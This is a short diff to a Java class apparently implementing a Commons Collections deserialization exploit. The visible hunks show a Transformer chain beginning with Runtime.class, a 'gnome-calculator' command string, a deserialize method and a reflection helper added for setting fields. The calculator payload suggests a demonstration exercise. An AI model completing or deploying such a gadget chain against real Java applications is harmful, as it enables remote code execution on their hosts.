@@ -11,17 +11,14 @@ import java.io.FileOutputStream;
 import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
 import java.lang.annotation.Target;
-import java.lang.reflect.Constructor;
-import java.lang.reflect.InvocationHandler;
-import java.lang.reflect.Method;
-import java.lang.reflect.Proxy;
+import java.lang.reflect.*;
 import java.util.HashMap;
 import java.util.Map;
 
 public class LazyFinalExp {
     public static void main(String[] args) throws Exception {
         HashMap<Object,Object> hashMap = new HashMap<>();
-        String cmd = "/usr/bin/gnome-calculator";
+        String cmd = "gnome-calculator";
 
         Transformer[] transformers = new Transformer[]{
                 new ConstantTransformer(Runtime.class),
@@ -66,5 +63,10 @@ public class LazyFinalExp {
     public static Object deserialize(String fileName) throws Exception {
         ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName));
         return ois.readObject();
+    }
+    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
+        Field field = obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+        field.set(obj, value);
     }
 }
